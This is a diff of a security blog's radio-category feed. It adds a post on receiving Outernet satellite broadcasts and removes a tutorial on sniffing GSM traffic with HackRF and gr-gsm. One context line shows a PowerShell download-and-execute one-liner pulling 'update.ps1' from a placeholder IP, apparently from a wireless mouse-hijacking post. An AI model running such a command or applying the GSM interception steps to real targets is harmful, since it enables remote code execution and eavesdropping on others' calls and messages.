@@ -4,7 +4,7 @@
   <title><![CDATA[Category: radio | The poetry of (in)security]]></title>
   <link href="http://www.ckn.io/blog/categories/radio/atom.xml" rel="self"/>
   <link href="http://www.ckn.io/"/>
-  <updated>2016-07-10T13:04:20+03:00</updated>
+  <updated>2016-12-29T14:44:00+03:00</updated>
   <id>http://www.ckn.io/</id>
   <author>
     <name><![CDATA[ck]]></name>
@@ -12,6 +12,74 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Receiving Outernet Satellite Broadcasts]]></title>
+    <link href="http://www.ckn.io/blog/2016/12/29/receiving-outernet-satellite-broadcasts/"/>
+    <updated>2016-12-29T10:18:31+03:00</updated>
+    <id>http://www.ckn.io/blog/2016/12/29/receiving-outernet-satellite-broadcasts</id>
+    <content type="html"><![CDATA[<p>Receiving satellite data is something I&rsquo;ve been hoping to try out for a while. It&rsquo;s an area that captures the magic of long range radio communication and has become easier to experiment in as time has gone by.</p>
+
+<!--more-->
+
+
+<p>This is where <a href="https://outernet.is" target="_blank"><strong>Outernet</strong></a> comes in. They are a global data broadcasting company that provides access to content all over the world through geostationary and low earth orbit satellites. They broadcast their signal over three Inmarsat satellites at a bitrate of about 2kbps or 20MB of content per day. Full information on the technology aspects can be found <a href="https://outernet.is/tech/" target="_blank"><strong>here</strong></a>.</p>
+
+<p>They provide a Do-It-Yourself kit for $99 that one can get up and running in a short amount of time. I already had the RTL-SDR V3 dongle and a Pi 3 so all I needed was their portable L-Band patch antenna and the Low Noise Amplifier. They&rsquo;ve documented the set up process extremely well so I&rsquo;ll not dwell on it here. Their detailed guide is available <a href="https://static1.squarespace.com/static/55ccfcb0e4b0c5b275895965/t/58325122579fb38c5719f2fb/1479692584995/Outernet+L-Band+Manual+v03.10.pdf" target="_blank"><strong>here</strong></a>.</p>
+
+<p>Here&rsquo;s my assembled hardware set up.</p>
+
+<p><img src="/images/outernet_hardware.jpg" width="500"></p>
+
+<p>Once the hardware is powered up, a wireless hotpspot called Outernet is created which you connect to and visit the page <strong>my.outernet.is</strong> on your browser. You&rsquo;ll be prompted for various initial configuraton details which you can also modify later to your liking. Of importance is the choice of the satellite to use, with three available. In my case. the one serving my region is <strong>Alphasat</strong> on the 1545.94 MHz frequency.</p>
+
+<p>The next step is to point the antenna directly at the satellite for good signal reception. A good way to find the direction of the satellite using the  <a href="https://play.google.com/store/apps/details?id=com.agi.android.augmentedreality&hl=en" target="_blank"><strong>Satellite AR</strong></a>  Android app. Check the Tuner Settings on the web dashboard while positioning the antenna until you get a Signal to Noise Ratio of at least 3dB.</p>
+
+<p><img src="/images/outernet_tuner.png"></p>
+
+<p>Data will start streaming in at the rate of 2kbps/20MB per day so give it some hours before you start exploring the downloaded content. Below is a sample of what the content includes after a week.</p>
+
+<h2>Amateur radio content from APRS and AMSAT</h2>
+
+<p>News and messages from APRS and AMSAT.</p>
+
+<p><img src="/images/outernet_amateur.gif"></p>
+
+<h2>Community content contributed by the public</h2>
+
+<p>Content uploaded to outernet servers by the community. The public is allowed to submit content which may be incorporated after review.</p>
+
+<p><img src="/images/outernet_community.gif"></p>
+
+<h2>Games</h2>
+
+<p>Browser based games.</p>
+
+<p><img src="/images/outernet_games.gif"></p>
+
+<h2>Offline Wikipedia pages</h2>
+
+<p>Select offline Wikpedia pages.</p>
+
+<p><img src="/images/outernet_wikipedia.gif"></p>
+
+<h2>News</h2>
+
+<p>Up to date news from around the world.</p>
+
+<p><img src="/images/outernet_news.gif"></p>
+
+<h2>Interactive weather data</h2>
+
+<p>And finally my favorite, a beautiful interactive 3D weather map that is simply amazing.</p>
+
+<p><img src="/images/outernet_weather.gif"></p>
+
+<p>The Outernet service is constantly evolving and I am looking forward to more exciting content and functionality.</p>
+
+<p>Till next time, happy hacking!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Hijacking wireless mice and keyboards]]></title>
@@ -95,7 +163,7 @@ powershell "iex (new-object net.webclient).downloadstring('http://IP/update.ps1'
 
 <p><a href="http://www.youtube.com/watch?v=YLzUeK1IvJs"><img src="http://img.youtube.com/vi/YLzUeK1IvJs/0.jpg" alt="IMAGE ALT TEXT HERE" /></a></p>
 
-<p>Further research on different wireless mice/keyboards is ongoing more so on the packet composition and encryption.</p>
+<p>Further research on different wireless mice/keyboards is ongoing, more so on the packet composition and encryption.</p>
 
 <p>Till next time, happy hacking!</p>
 ]]></content>
@@ -399,111 +467,6 @@ We restart wireshark on the loopback interface and then run the following comman
 They also automated a lot of the steps in this post making decryption of gsm voice and data almost trivial.</p>
 
 <p>In the next post I&rsquo;ll demonstrate how to decrypt voice traffic :) as I continue explaining GSM communication.
-Till then, happy hacking.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Sniffing GSM Traffic]]></title>
-    <link href="http://www.ckn.io/blog/2015/11/01/sniffing-gsm-traffic/"/>
-    <updated>2015-11-01T09:30:27+03:00</updated>
-    <id>http://www.ckn.io/blog/2015/11/01/sniffing-gsm-traffic</id>
-    <content type="html"><![CDATA[<p>I have been playing around with the HackRF for the past couple of weeks and progressively exploring the Radio Frequency spectrum. In this post I&rsquo;ll take you through how to sniff GSM traffic. I&rsquo;ll be specifically monitoring the <a href="https://en.wikipedia.org/wiki/Um_interface" target="_blank"><strong>Um interface</strong></a>. This in the air interface between the Mobile Station (MS) and the Base Transceiver Station (BTS). The MS in this case will be the mobile phone while the BTS is what the phone connects to on the Mobile network. The BTS is usually hosted on towers which you can spot in various locations. Here is what a typical one looks like.</p>
-
-<!--more-->
-
-
-<p><img src="/images/BTS.jpg" width="400"></p>
-
-<p>We first ensure that our HackRF is well set up as detailed in <a href="https://www.ckn.io/blog/2015/10/11/the-hackrf-one-first-steps/" target="_blank"><strong>this earlier post</strong></a>.
-This setup is tailored to Archlinux but other linux distros closely follow the same process.
-Next we install <a href="https://github.com/ptrkrysik/gr-gsm" target="_blank"><strong>gr-gsm</strong></a> which consists of gnuradio blocks and tools for receiving GSM transmissions.</p>
-
-<h3><strong><em>Setting up gr-gsm</em></strong></h3>
-
-<p>Install libosmocore libraries
-<code>bash
-yaourt -S libosmocore   
-</code></p>
-
-<p>Install gr-gsm
-<code>bash
-git clone https://github.com/ptrkrysik/gr-gsm
-cd gr-gsm
-mkdir build
-cd build
-cmake ..
-make
-sudo make install
-sudo ldconfig
-</code></p>
-
-<p>Add the path of the gr-gsm blocks to gnuradio
-<code>bash
-nano ~/.gnuradio/config.conf    
-    [grc]
-    local_blocks_path=/usr/local/share/gnuradio/grc/blocks
-</code></p>
-
-<p>Move gr-gsm library and python modules to correct location (depends on your environment).
-<code>bash
-sudo mv /usr/local/lib/python2.7/site-packages/grgsm /usr/lib/python2.7/site-packages/
-sudo mv /usr/local/lib/libgnuradio-grgsm.so /usr/lib/
-</code></p>
-
-<p>Next we will set up kalibrate-hackrf which we will use to find what GSM frequencies to sniff on.</p>
-
-<h3><strong><em>Setting up kalibrate-hackrf</em></strong></h3>
-
-<pre><code class="bash">git clone https://github.com/scateu/kalibrate-hackrf.git
-cd kalibrate-hackrf
-./bootstrap
-./configure
-make
-sudo make install
-</code></pre>
-
-<h3><strong><em>Finding GSM frequencies</em></strong></h3>
-
-<p>With our prerequisites done, the next step is to find GSM frequencies to listen on. First we consult <a href="http://www.worldtimezone.com/gsm.html" target="_blank"><strong>this site</strong></a> to identify GSM bands used by our local providers.</p>
-
-<p><img src="/images/gsm_bands.png"></p>
-
-<p>Let&rsquo;s concentrate on the 900MHz band for now.
-We use kalibrate-hackrf (kal) to find the frequencies as below:</p>
-
-<pre><code class="bash">kal -s GSM900 -g 40 -l 40
-</code></pre>
-
-<p><strong>-s</strong> is the band to scan, <strong>-g</strong> is the baseband gain and <strong>-l</strong> the interface gain
-Let it run for a minute or so and you should get output similar to:</p>
-
-<p><img src="/images/kal.png"></p>
-
-<h3><strong><em>Sniffing!</em></strong></h3>
-
-<p>Let us now use gqrx to confirm the frequencies by tuning in to the first one. In this case <strong>936.4MHz</strong></p>
-
-<p><img src="/images/gqrx_gsm.png"></p>
-
-<p>We can see that the activity is centered around <strong>936.8MHz</strong> so we adjust accordingly and use that as the frequency.
-We now start capturing gsm traffic using gr-gsm :). What we do is launch gnuradio companion and open <strong>the airprobe_rtlsdr.grc</strong> block that is part of gr-gsm and run it.</p>
-
-<pre><code class="bash">gnuradio-companion airprobe_rtlsdr.grc
-</code></pre>
-
-<p>Tune to <strong>936.8MHz</strong> and if all went well we should get data streaming through the console window.</p>
-
-<p><img src="/images/gr_gsm_traffic.png"></p>
-
-<p>We finally launch wireshark and monitor the loopback interface to see the decoded traffic :)
-Here is a sample showing BTS Location details.</p>
-
-<p><img src="/images/gsm_wireshark.png"></p>
-
-<p>So what next after sniffing the traffic?
-In subsequent posts I&rsquo;ll explain and show how to interpret the decoded traffic as I explain how GSM communication takes place.
-From there I&rsquo;ll demonstrate how to decrypt the traffic. That is where it gets really interesting as we start reading SMS&rsquo;s, listening to calls and so on :).
 Till then, happy hacking.</p>
 ]]></content>
   </entry>
